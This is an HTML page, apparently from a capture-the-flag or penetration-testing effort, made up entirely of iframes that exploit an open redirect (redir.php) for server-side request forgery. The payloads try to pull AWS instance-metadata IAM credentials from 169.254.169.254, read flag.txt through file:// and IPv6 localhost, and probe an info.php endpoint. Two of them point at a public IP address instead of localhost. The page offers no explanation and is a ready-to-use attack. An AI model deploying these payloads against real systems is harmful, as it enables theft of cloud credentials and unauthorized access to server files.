<!DOCTYPE html>
<html>
<head>
    <title>Focused High-Probability Test</title>
</head>
<body>
    <h1>Most Promising Techniques</h1>
    
    <!-- AWS Legacy API (most likely to work) -->
    <h3>1. AWS Legacy API (Pre-IMSv2)</h3>
    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/" width="100%" height="200"></iframe>
    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/" width="100%" height="200"></iframe>
    
    <!-- IPv6 localhost variations -->
    <h3>2. IPv6 Localhost (Based on ::1 in responses)</h3>
    <iframe src="http://localhost/redir.php?url=http://[::1]/flag.txt" width="100%" height="150"></iframe>
    <iframe src="http://localhost/redir.php?url=file://[::1]/flag.txt" width="100%" height="150"></iframe>
    
    <!-- Server ready endpoint expansion -->
    <h3>3. Info.php Endpoint (Got "Server ready")</h3>
    <iframe src="http://localhost/redir.php?url=http://localhost/info.php?show=flag" width="100%" height="150"></iframe>
    <iframe src="http://localhost/redir.php?url=http://localhost/info.php?flag=1" width="100%" height="150"></iframe>
    <iframe src="http://localhost/redir.php?url=http://localhost/info.php?action=flag" width="100%" height="150"></iframe>
    
    <!-- Version 1.0 direct access -->
    <h3>4. Version 1.0 Access (From Release Notes)</h3>
    <iframe src="http://54.209.100.76/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100%" height="200"></iframe>
    <iframe src="http://54.209.100.76/redir.php?url=file:///flag.txt" width="100%" height="150"></iframe>
</body>
</html>
